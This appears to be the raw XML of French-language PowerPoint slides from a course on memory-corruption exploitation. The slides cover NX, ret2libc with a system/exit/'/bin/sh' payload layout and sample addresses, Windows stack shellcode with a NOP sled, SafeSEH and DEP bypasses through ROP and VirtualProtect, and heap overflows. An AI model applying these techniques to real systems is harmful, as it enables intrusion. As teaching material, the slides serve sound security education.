              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>différentes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>adresses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Informations</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>fuite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> (leak) :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Identifier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adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>valide</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via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fuite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire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397796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3B026-FD09-76B1-E7C5-ACFAE3F0A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Exploitation avec NX (1/2)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544E8-5084-1CCA-D3A4-A550009DD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NX (No </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>eXecute</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>):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Empêche</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de code dans des zones </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>marquées</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécutables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Impact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Rend les shellcodes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>injectés</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans la pile </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>inutilisables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337569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DC43-15A8-58AD-0A42-644CCB36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Exploitation avec NX (2/2)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10586-2A30-3A7D-E7B0-B1B1C92C2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Contournement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Utilisation de Ret2Libc.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Invocation </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>directe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonctions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>existantes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>exécutable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90190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BE5E0-1BB7-D5D2-C5FE-79C6A88A1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1"/>
            <a:ext cx="9144000" cy="869092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ret2libc</a:t>
            </a:r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540FB6-EFE9-2FD0-F1F0-7376E222DD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126713"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1430338" y="2286000"/>
          <a:ext cx="9237662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937770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195AA-CADC-837A-FCF7-C3E3E3B6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Principe de ret2libc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270070-86C3-7BE1-0404-FEFAD19979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8115016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33434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6B1F-9861-BE0B-5149-EC0F5672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Ret2libc - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>Étapes de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'attaque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257EB-CD4D-A1F3-09C5-7B4A787D9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/>
              <a:t>Localiser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>l'adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>fonctions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>libc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Identifier </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de system et </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'autres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonctions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>utiles</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>libc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>chargée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Construire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> la charge utile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Une nouvelle pile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construite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, qui </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>remplace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> l'ancienne </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>lors</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>dépassement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> 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[</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de system] [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de exit] [</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de "/bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>"]</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr rtl="0"/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system("/bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>") </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ouvre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un shell.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exit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>termine</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>proprement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> le programme.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-GB" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:endParaRPr lang="en-GB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10791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3707-4319-6EBF-D4E6-1D8908DC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Ret2libc - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de charge utile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456E-43A9-93C9-7737-49B413AAE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r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Supposons</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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L'adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de system = 0xf7e12420.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L'adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de /bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> = 0xf7f54345.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L'adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de exit = 0xf7e09250.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B2EDAA-D4AC-4076-9282-76BFB610F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83" y="4191000"/>
            <a:ext cx="7772400" cy="309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60924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D80AF-ECA9-63EC-0BB5-61D4832F3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Exploitation sur IA-64 (1/3)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8C870-B1B1-5F3F-38BF-65EFC83BD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/>
          </a:bodyPr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Particularités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>l’architecture</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> 64 bits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Registres</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>étendus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Nouveau </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>modèle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire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Impact sur les exploits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Gestion </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>différente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des piles.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504490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DB4423-716D-4B40-9498-69F5F3E5E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B339CD8-1850-4DF2-BCDF-1CAAE5F87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805C8-8D0E-ECBE-6EF2-171701351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2286000"/>
            <a:ext cx="3965456" cy="2285999"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:norm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Exploitation sur IA-64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CA7A5-A402-071E-DF3F-3FCCA3657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62000"/>
            <a:ext cx="4572000" cy="5334000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr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Adaptations </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>nécessaires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Adresses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> 64 bits.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Analyse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>approfondie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du code </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>assembleur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809201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10112-0E91-AD33-293D-7429A7A66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aux Buffer Overflows sous Windows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6A988-54A4-9D32-041F-D6BDFB642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Objectif : </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Comprendre</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>particularités</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'exploitation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sous Windows.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Problématique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Gestion </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>différente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> par rapport à Linux.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Présence</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de protections </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>spécifiques</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> : /GS, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>SafeSEH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, DEP.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516198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9F72C-E3FB-4C48-AEBD-AF7AC0D74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DE77F2-18D0-49FF-860C-62E2AC424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4BF35-ACDF-9855-5B32-1CB1AF00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180" y="1524000"/>
            <a:ext cx="4009639" cy="3810000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Exploitation sans protection sous Windows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361CD-480D-2452-6E6E-B0D018DCC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680" y="762000"/>
            <a:ext cx="3897332" cy="3154154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120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-GB" sz="1400" b="1"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" b="1"/>
              <a:t>Slide 22 : Exploitation sans protection - Concepts de base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400"/>
              <a:t>Comme sous Linux, les étapes </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" err="1"/>
              <a:t>principales</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400"/>
              <a:t> :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400"/>
              <a:t>Identifier la taille du buffer.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400" err="1"/>
              <a:t>Injecter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400"/>
              <a:t> un shellcode dans la pile.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400" err="1"/>
              <a:t>Réécrire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" err="1"/>
              <a:t>l’adresse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400"/>
              <a:t> de retour pour pointer sur le shellcode.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GB" sz="1400" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400"/>
              <a:t> d’un programme </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" err="1"/>
              <a:t>vulnérable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400"/>
              <a:t> Windows (C++) :</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="fr-FR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70E084-B98E-B03C-4D7E-CD70820F3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740" y="3985464"/>
            <a:ext cx="6964521" cy="276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56184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96513-D161-B213-A907-A9ACD63C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Exploitation sans protection - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>Exemple</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pratique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E77B3-375E-8850-E7BA-3992DCA71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Étapes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Utiliser Immunity Debugger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WinDbg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour analyser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l'application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Identifier la structure de la pile et localiser </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’EIP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Construire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> un exploit avec un sled NOP et un shellcode.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BB7A2-0714-841A-CF3A-C7B513DFD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191000"/>
            <a:ext cx="7772400" cy="287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2049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9EA8F-092C-FC7A-136B-657DA1340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Contournement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> de la protection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>SafeSEH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75432-4EC7-AEAB-7623-3B418A411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 marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>SafeSEH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> (Safe Structured Exception Handling)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Mécanisme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> Windows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Contrôle</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>gestionnaires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>d'exceptions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (SEH).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Bloque</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> les </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>gestionnaires</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>valides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non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>enregistrés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Impact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Limite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exploitation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> via SEH overwriting.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215694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058A0-89EC-083C-D024-A602EAFD4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Contournement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>SafeSEH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22208-8969-12D5-3532-C4D355D57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Techniques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Modules sans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>SafeSEH</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB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Localiser des DLL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>ou</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> modules chargés sans protection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>SafeSEH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Bypass </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>complet</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB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Exploiter un </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comportement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>inattendu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>contourner</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> la validation SEH.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Exemple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Utilisation de gadgets dans </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>une</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> DLL non protégée pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>rediriger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exécution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981086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DA23C9-860F-CB91-0E51-36A8BCE94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 b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>DEP (Data Execution Prevention)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80B215-2652-F19A-EE2F-E998DA7D75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3714670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03016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D7759-5B61-5F8E-02FE-2B489DEBD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Contournement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du DEP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8F54E-AD7F-DDBE-0FF2-99C626917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Techniques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Ret2Libc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> 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Appel de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>fonctions</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>systèmes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>légitimes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>comme</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>VirtualProtect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VirtualAlloc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB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ROP (Return Oriented Programming)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> 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 err="1"/>
              <a:t>Chaînage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de gadgets pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>réactiver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>l’exécution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> sur la pile.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Exemple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Utilisation de gadgets pour modifier les permissions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire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320267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69E727-9FBD-426F-8146-7962900A2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97A9DDA-5820-45F0-AD3F-126859F42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9337" y="762000"/>
            <a:ext cx="5356272" cy="53562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61D5F-E249-D48B-31B9-E739EB7A0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962" y="2285999"/>
            <a:ext cx="3893023" cy="22860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Autres types d’Overflow</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="410760776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BC08B-7511-798F-AD7C-6FABF231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Débordement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>tas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> (Heap Overflow)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5B57-91E9-B22A-54C9-E424E7CC8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Principe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Dépassement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>allouée</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> dans le </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>tas.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Impact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Modification des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>métadonnées</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> du </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>gestionnaire</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>mémoire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Exploitation pour </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>écraser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> des </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>adresses</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>importantes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DFE01-7999-0F60-3DD2-07AF2BA46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83" y="4483990"/>
